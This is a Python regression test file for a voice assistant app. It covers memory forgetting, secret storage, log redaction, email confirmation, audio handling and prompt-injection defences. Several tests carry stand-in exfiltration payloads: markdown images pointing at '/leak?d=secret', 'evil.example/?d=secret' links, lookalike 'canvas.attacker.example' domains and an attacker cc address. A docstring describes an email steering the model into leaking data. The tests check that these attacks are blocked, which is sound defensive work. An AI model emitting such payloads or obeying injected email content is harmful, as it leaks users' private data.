"""Milestone 1 (reliability, privacy, safety) regressions found by the flagship audit. Each test fails on the
code before the fix."""
from __future__ import annotations

from monkey.memory.history import HistoryStore


def _store(tmp_path):
    h = HistoryStore(tmp_path / "h.db")
    sid = h.start_session("old")
    return h, sid


def test_forget_removes_the_fact_from_past_messages_and_episodes(tmp_path):
    h, sid = _store(tmp_path)
    h.add_message(sid, "user", "my locker code is 4471 at the rec center", "typed")
    h.add_message(sid, "user", "what's the weather tomorrow", "typed")
    h.add_episode(sid, "Talked about the rec center locker code 4471.", ["gym"], [], [], "test")
    assert h.search("locker code", scope="all")
    out = h.forget("locker code is 4471")
    assert out["messages"] == 1 and out["episodes"] == 1
    assert not h.search("locker code", scope="all")
    assert not h.search("4471", scope="all")
    assert h.search("weather", scope="all")                         # unrelated history stays


def test_sensitive_past_messages_and_episodes_stay_out_of_automatic_recall(tmp_path):
    h, sid = _store(tmp_path)
    h.add_message(sid, "user", "my therapist said my anxiety medication dose should change", "typed")
    h.add_episode(sid, "Talked about anxiety medication and the therapist.", [], [], [], "test")
    assert not h.search("therapist medication", scope="all", include_sensitive=False)
    assert h.search("therapist medication", scope="all", include_sensitive=True)   # an explicit look-up still can


def test_effort_messages_keep_output_config_after_saving(tmp_path):
    from tests.test_agent_loop import build, text_block

    agent, client, *_ = build(tmp_path, [([text_block("Sup.")], "end_turn"), ([text_block("Here's why.")], "end_turn"),
                                         ([text_block("And more.")], "end_turn")])
    agent.handle("yo")
    agent.handle("how did I sleep?")                    # adds an effort message, then the conversation is saved
    agent.handle("and the night before?")
    third = client.calls[2]
    sys_msgs = [m for m in third["messages"] if m.get("role") == "system"]
    assert sys_msgs, "the effort message should still be there"
    assert all("output_config" in m for m in sys_msgs), "saving must not strip output_config (API would 400)"


def test_a_failed_read_never_erases_the_saved_keys(tmp_path, monkeypatch):
    from pathlib import Path

    from monkey.secretstore import SecretStore

    st = SecretStore(tmp_path / "secrets.dat")
    st.set("anthropic", "sk-ant-1")
    st.set("fish", "fish-2")
    real = Path.read_text
    fails = {"n": 0}

    def flaky(self, *a, **k):
        if self.name == "secrets.dat" and fails["n"] < 10:      # antivirus holds the file for a while
            fails["n"] += 1
            raise PermissionError("locked")
        return real(self, *a, **k)
    monkeypatch.setattr(Path, "read_text", flaky)
    st.set("google_token", "tok-3")                              # reads the backup instead of starting from {}
    monkeypatch.setattr(Path, "read_text", real)
    assert st.get("anthropic") == "sk-ant-1" and st.get("fish") == "fish-2" and st.get("google_token") == "tok-3"


def test_with_no_backup_a_failed_read_refuses_to_write(tmp_path, monkeypatch):
    from pathlib import Path

    import pytest

    from monkey.secretstore import SecretStore

    st = SecretStore(tmp_path / "secrets.dat")
    st.set("anthropic", "sk-ant-1")
    st._backup.unlink(missing_ok=True)
    real = Path.read_text
    monkeypatch.setattr(Path, "read_text", lambda self, *a, **k: (_ for _ in ()).throw(PermissionError("locked"))
                        if self.name == "secrets.dat" else real(self, *a, **k))
    with pytest.raises(OSError):
        st.set("google_token", "tok")
    monkeypatch.setattr(Path, "read_text", real)
    assert st.get("anthropic") == "sk-ant-1"


def test_logs_never_carry_keys_tokens_or_private_calendar_links(tmp_path):
    import logging

    from monkey import logsafe

    path = tmp_path / "monkey.log"
    h = logging.FileHandler(path, encoding="utf-8")
    logsafe.install([h])
    log = logging.getLogger("monkey.test_logsafe")
    log.addHandler(h)
    log.setLevel(logging.INFO)
    log.info("GET https://www.googleapis.com/youtube/v3/search?q=x&key=AIzaSyA1234567890abcdefghijklmnop")
    log.info("calendar https://calendar.google.com/calendar/ical/me%40gmail.com/private-abc123/basic.ics fetched")
    log.info("canvas feed https://canvas.wisc.edu/feeds/calendars/user_ABCDEF123.ics")
    log.info("auth header Bearer abcdefghijklmnop.qrstuv and key sk-ant-api03-SECRETSECRET")
    log.info("token=ya29.SECRET&refresh_token=1//SECRET for someone@example.com")
    h.close()
    text = path.read_text()
    for secret in ("AIzaSyA1234567890", "private-abc123", "user_ABCDEF123", "abcdefghijklmnop.qrstuv",
                   "sk-ant-api03-SECRET", "ya29.SECRET", "1//SECRET", "someone@example.com"):
        assert secret not in text, secret
    assert logging.getLogger("httpx").level == logging.WARNING      # request URLs aren't logged at all


def _gate_with_draft(cc=()):
    from monkey.brain.approval import ApprovalGate, PendingDraft

    sent = []
    g = ApprovalGate({"gmail": lambda d: sent.append(d)})
    d = PendingDraft("d1", "gmail", "p1", ["prof@school.edu"], list(cc), "Lab", "Hi")
    g.register(d)
    return g, sent


def test_voice_confirmation_reads_back_cc_recipients():
    g, sent = _gate_with_draft(cc=["attacker@evil.test"])
    action, msg = g.handle_voice("send it")
    assert action == "confirm_needed" and "attacker@evil.test" in msg


def test_yes_but_is_not_a_confirmation():
    for reply in ("yes, but make it shorter first", "yeah change the subject", "yes actually wait", "yes add a line"):
        g, sent = _gate_with_draft()
        g.handle_voice("send it")
        g.handle_voice(reply)
        assert not sent, reply
    g, sent = _gate_with_draft()
    g.handle_voice("send it")
    assert g.handle_voice("yes send it")[0] == "sent" and sent
    for ok in ("Yes. Send it.", "Yes, perfect.", "send it now", "Okay, send it!", "Perfect, thanks."):
        g, sent = _gate_with_draft()
        g.handle_voice("send it")
        assert g.handle_voice(ok)[0] == "sent" and sent, ok
    for not_ok in ("now", "yes send it to everyone", "send it to mom instead"):
        g, sent = _gate_with_draft()
        g.handle_voice("send it")
        g.handle_voice(not_ok)
        assert not sent, not_ok


def test_claude_calls_have_bounded_timeouts(monkeypatch):
    from monkey.brain import router

    seen = {}

    class C:
        class messages:
            @staticmethod
            def parse(**kw):
                seen.update(kw)
                raise TimeoutError("slow")
    import pytest

    with pytest.raises(TimeoutError):
        router.classify_with_haiku(C, "anything")
    assert seen.get("timeout") and seen["timeout"] <= 5

    class WithOptions(C):
        opts = {}

        @classmethod
        def with_options(cls, **kw):
            cls.opts.update(kw)
            return C
    with pytest.raises(TimeoutError):
        router.classify_with_haiku(WithOptions, "anything")
    assert WithOptions.opts.get("max_retries") == 0     # no SDK retries stretching the 4 s cap
    r = router.Router(classify=lambda t: router.classify_with_haiku(C, t))
    r.pick_task.__func__  # the router turns a classifier failure into "general" (existing behaviour)
    task, reason = router.Router(classify=lambda t: (_ for _ in ()).throw(TimeoutError())).pick_task("zxqv blorp")
    assert task == "general" and "classifier failed" in reason
    import inspect

    from monkey import app

    assert "timeout=anthropic.Timeout(" in inspect.getsource(app.MonkeyApp._ensure_client)


def test_brief_weather_uses_the_real_weather_shape():
    from monkey.routines.morning import weather_line

    real = {"location": "Madison", "periods": [
        {"name": "Today", "temp": "64°F", "wind": "10 mph SW", "short": "Sunny", "detail": "...", "icon": ""},
        {"name": "Tonight", "temp": "48°F", "wind": "5 mph W", "short": "Clear", "detail": "...", "icon": ""}]}
    line = weather_line(real)
    assert line == "Madison: Today 64°F, Sunny, wind 10 mph SW; Tonight 48°F"
    assert "periods" not in line and "{" not in line                  # never a raw data dump
    assert weather_line({"summary": "Rain later"}) == "Rain later"


def test_speaker_reopens_after_a_portaudio_reset(monkeypatch):
    """A microphone reconnect resets PortAudio, which closes the speaker's stream too: it must come back."""
    import sys
    import types

    from monkey.audio import devices
    from monkey.audio.speaker import Speaker

    opened = []

    class FakeStream:
        def __init__(self, **kw):
            self.active = False
            opened.append(self)

        def start(self):
            self.active = True

        def abort(self):
            self.active = False

        def close(self):
            self.active = False
    fake_sd = types.SimpleNamespace(OutputStream=FakeStream, _terminate=lambda: [s.abort() for s in opened],
                                    _initialize=lambda: None)
    monkeypatch.setitem(sys.modules, "sounddevice", fake_sd)
    monkeypatch.setattr(devices, "_after_reset", [])
    monkeypatch.setattr(devices, "_before_reset", [])
    events = []
    fake_sd._terminate = lambda: events.append(("terminate", [s.active for s in opened]))
    sp = Speaker([], on_level=lambda v: None, on_state=lambda v: None)
    sp.start()
    assert len(opened) == 1 and opened[0].active
    devices.reset_portaudio()                       # what the mic watchdog does after sleep / a headset change
    assert len(opened) == 2 and opened[-1].active and sp._stream is opened[-1]
    assert events == [("terminate", [False])]       # our stream was closed *before* Pa_Terminate, not left dangling
    sp.reopen()
    sp.reopen()                                     # back-to-back reopens (watchdog + reset) leave exactly one stream
    assert sum(s.active for s in opened) == 1 and sp._stream.active


def test_speaker_retries_when_no_output_device_was_available(monkeypatch):
    import sys
    import types

    from monkey.audio import devices
    from monkey.audio.speaker import Speaker

    state = {"fail": True}

    class FakeStream:
        def __init__(self, **kw):
            if state["fail"]:
                raise OSError("no default output device")
            self.active = False

        def start(self):
            self.active = True

        def abort(self):
            self.active = False

        close = abort
    monkeypatch.setitem(sys.modules, "sounddevice", types.SimpleNamespace(OutputStream=FakeStream))
    monkeypatch.setattr(devices, "_after_reset", [])
    monkeypatch.setattr(devices, "_before_reset", [])
    sp = Speaker([], on_level=lambda v: None, on_state=lambda v: None)
    sp.start()                                      # no device yet: must not raise, and must not give up
    assert sp._stream is None and sp._stream_dead()
    state["fail"] = False                           # headset plugged in
    sp.reopen()
    assert sp._stream is not None and not sp._stream_dead()


def test_microphone_open_and_close_hold_the_portaudio_lock(monkeypatch):
    import sys
    import types

    from monkey.audio import devices
    from monkey.audio.listener import Listener

    held = []

    class FakeIn:
        def __init__(self, **kw):
            held.append(devices.PA_LOCK._is_owned())

        def start(self):
            pass

        def stop(self):
            held.append(devices.PA_LOCK._is_owned())

        def close(self):
            pass
    monkeypatch.setitem(sys.modules, "sounddevice", types.SimpleNamespace(InputStream=FakeIn))
    lst = Listener.__new__(Listener)
    lst._stream_factory, lst._stream, lst._callback = None, None, lambda *a: None
    lst._stream = lst._open_stream()
    lst._close_stream()
    assert held == [True, True]


def test_wake_cancels_the_reply_before_silencing_the_speaker():
    import inspect

    from monkey.app import MonkeyApp

    src = inspect.getsource(MonkeyApp._on_wake)
    assert src.index("agent.cancel()") < src.index("speaker.stop()")


def test_markdown_images_from_the_model_never_load(tmp_path):
    """An email can steer the model into ![](https://attacker/?d=secret): that must not fetch anything."""
    import http.server
    import threading
    from pathlib import Path

    import pytest

    pytest.importorskip("playwright")
    from tools.automation_eval import browser_path

    dist = Path(__file__).resolve().parents[1] / "ui" / "dist" / "index.html"
    if browser_path() is None or not dist.is_file():
        pytest.skip("needs Chromium and a built UI (npm run build)")
    hits = []

    class H(http.server.BaseHTTPRequestHandler):
        def do_GET(self):
            hits.append(self.path)
            self.send_response(200)
            self.end_headers()

        def log_message(self, *a):
            pass
    srv = http.server.ThreadingHTTPServer(("127.0.0.1", 0), H)
    threading.Thread(target=srv.serve_forever, daemon=True).start()
    port = srv.server_address[1]
    from playwright.sync_api import sync_playwright

    with sync_playwright() as pw:
        b = pw.chromium.launch(executable_path=browser_path())
        p = b.new_page()
        p.goto(dist.as_uri() + "?demo")
        p.wait_for_function("() => !!window.__monkeyEvents", timeout=15000)
        p.evaluate("""port => window.__monkeyEvents([["panel", {title: "Summary", markdown:
            `Here you go ![x](http://127.0.0.1:${port}/leak?d=secret) <img src="http://127.0.0.1:${port}/leak2">`}]])""",
                   port)
        p.wait_for_timeout(800)
        links = p.eval_on_selector_all(".md a", "els => els.map(e => e.textContent)")
        imgs = p.eval_on_selector_all(".md img", "els => els.length")
        b.close()
    srv.shutdown()
    assert hits == [], hits
    assert imgs == 0 and any("open" in t for t in links)


def _runner():
    from monkey.brain.tools import Services, ToolRunner

    opened = []

    class Mem:                                        # the default sites.md shortcuts in a real install
        @staticmethod
        def site_shortcuts():
            return {"canvas": "https://canvas.wisc.edu"}
    r = ToolRunner(Services(emit=lambda *a: None, memory=Mem(), approval=None, open_url=opened.append))
    return r, opened


def test_outside_content_keeps_blocking_memory_writes_on_later_turns():
    r, _ = _runner()
    r.begin_turn("read my latest email", ["read my latest email"])
    r.mark_untrusted("read_email")
    r.begin_turn("ok cool", ["read my latest email", "ok cool"])               # next turn, same conversation
    assert r.memory_write_blocked()
    r.begin_turn("hi", ["hi"])                                                 # a new conversation starts clean
    assert not r.memory_write_blocked()


def test_links_from_outside_content_are_held_until_the_user_names_or_confirms_them():
    r, opened = _runner()
    hist = ["summarize the email from my TA"]
    r.begin_turn(hist[-1], hist)
    r.mark_untrusted("read_email")
    out = r.t_open_website("https://evil.example/?d=secret")
    assert not opened and "Not opened" in out
    hist.append("yes open it")                                   # the user heard the address and said yes
    r.begin_turn(hist[-1], hist)
    r.t_open_website("https://evil.example/?d=secret")
    assert opened == ["https://evil.example/?d=secret"]
    hist.append("open canvas please")                            # a site the user names is always fine
    r.begin_turn(hist[-1], hist)
    r.t_open_website("https://canvas.wisc.edu/courses/1")
    assert opened[-1].startswith("https://canvas.wisc.edu")
    out = r.t_open_website("https://canvas.attacker.example/?d=x")   # "canvas" said, but the real site is "attacker"
    assert "Not opened" in out and len(opened) == 2


def test_school_and_calendar_lookups_dont_lock_out_normal_links():
    r, opened = _runner()
    hist = ["what is due this week"]
    r.begin_turn(hist[-1], hist)
    r.mark_untrusted("get_assignments")                          # Canvas data: not a stranger's free text
    hist.append("open the chem homework")
    r.begin_turn(hist[-1], hist)
    r.t_open_website("https://canvas.wisc.edu/courses/123/assignments/456")
    assert opened, "an assignment lookup must not block opening links for the rest of the chat"


def test_any_website_still_asks_before_carrying_data_to_another_site():
    from monkey.automation.permissions import Action, PermissionGate
    from monkey.automation.tasks import Task

    t = Task(objective="o", allowed_domains=["*"])
    g = PermissionGate()
    page = "https://canvas.wisc.edu/courses/1/modules"
    assert g.authorize(t, Action("navigate", url="https://duosecurity.com/frame/prompt"), page_url=page).allowed
    assert g.authorize(t, Action("navigate", url="https://canvas.wisc.edu/x?" + "a=1&" * 40), page_url=page).allowed
    d = g.authorize(t, Action("navigate", url="https://evil.example/c?d=" + "x" * 120), page_url=page)
    assert not d.allowed and d.needs_approval
    d = g.authorize(t, Action("navigate", url="https://evil.example/" + "x" * 120), page_url=page)
    assert not d.allowed and d.needs_approval                       # data in the path counts too
    assert g.authorize(t, Action("navigate", url="https://evil.example/c?d=" + "x" * 120),
                       page_url="about:blank").allowed              # nothing loaded yet: no page data to carry
    uk = "https://learn.ox.ac.uk/a"
    assert g.authorize(t, Action("navigate", url="https://files.ox.ac.uk/x?" + "a=1&" * 40), page_url=uk).allowed
    d = g.authorize(t, Action("navigate", url="https://evil.ac.uk/x?" + "a=1&" * 40), page_url=uk)
    assert not d.allowed and d.needs_approval                       # .ac.uk is a suffix, not one site


def test_forget_matches_whole_words_not_substrings(tmp_path):
    h, sid = _store(tmp_path)
    h.add_message(sid, "user", "we had olives at a Madison restaurant", "typed")
    h.add_message(sid, "user", "I live in Madison now", "typed")
    h.forget("Lives in Madison")
    left = [m["text"] for m in h.messages(sid)]
    assert "we had olives at a Madison restaurant" in left              # "olives" is not "lives"
    assert "I live in Madison now" not in left                          # the user's own wording is caught


def test_tracebacks_are_redacted_and_ordinary_lines_stay_readable(tmp_path):
    import logging

    from monkey import logsafe

    path = tmp_path / "m.log"
    h = logging.FileHandler(path, encoding="utf-8")
    logsafe.install([h])
    log = logging.getLogger("monkey.test_tb")
    log.addHandler(h)
    log.setLevel(logging.INFO)
    try:
        raise RuntimeError("GET https://x.googleapis.com/v3/search?q=a&key=AIzaSyA1234567890abcdefghijklmnop failed")
    except RuntimeError:
        log.warning("search failed", exc_info=True)
    log.info("process exited with code=1; settings key=wake_word")
    h.close()
    text = path.read_text()
    assert "AIzaSyA1234567890" not in text and "RuntimeError" in text      # traceback kept, key gone
    assert "code=1" in text and "key=wake_word" in text                    # not mangled


def test_a_deleted_key_file_is_empty_not_restored_from_backup(tmp_path):
    from monkey.secretstore import SecretStore

    st = SecretStore(tmp_path / "secrets.dat")
    st.set("anthropic", "sk-ant-1")
    (tmp_path / "secrets.dat").unlink()             # the owner reset Monkey's keys on purpose
    assert SecretStore(tmp_path / "secrets.dat").get("anthropic") in (None, "")


def test_restart_helper_is_not_fully_detached():
    import inspect

    from monkey import lifecycle

    src = inspect.getsource(lifecycle.spawn_detached)
    assert "CREATE_NEW_PROCESS_GROUP" in src and '"DETACHED_PROCESS"' not in src
